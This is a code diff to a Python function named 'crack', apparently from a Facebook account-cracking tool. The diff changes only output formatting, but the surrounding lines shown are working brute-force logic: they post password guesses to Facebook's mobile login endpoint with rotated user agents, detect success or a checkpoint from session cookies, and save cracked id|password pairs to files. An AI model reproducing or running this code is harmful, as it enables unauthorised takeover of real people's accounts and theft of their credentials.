@@ -422,7 +422,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	print('\r%s👉 %s/%s - - > [ok]%s - - -> [cp]%s - - -> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	print('\r%s👉 %s/%s :- - > [ok]%s :- - -> [cp]%s :- - -> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
 	ua = random.choice(uao).replace('\n','')
 	ses = requests.Session()
 	for pw in pwv:
@@ -432,12 +432,12 @@ def crack(idf,pwv):
 			z = ses.get('https://m.facebook.com')
 			j = ses.post('https://m.facebook.com/login.php', data=dt, headers=head, allow_redirects=True)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
+				print('\r%s:-> %s|%s:-> CP       '%(b,idf,pw))
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
-				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
+				print('\r%s:-> %s|%s :-> OK       '%(h,idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				ok+=1
 				break
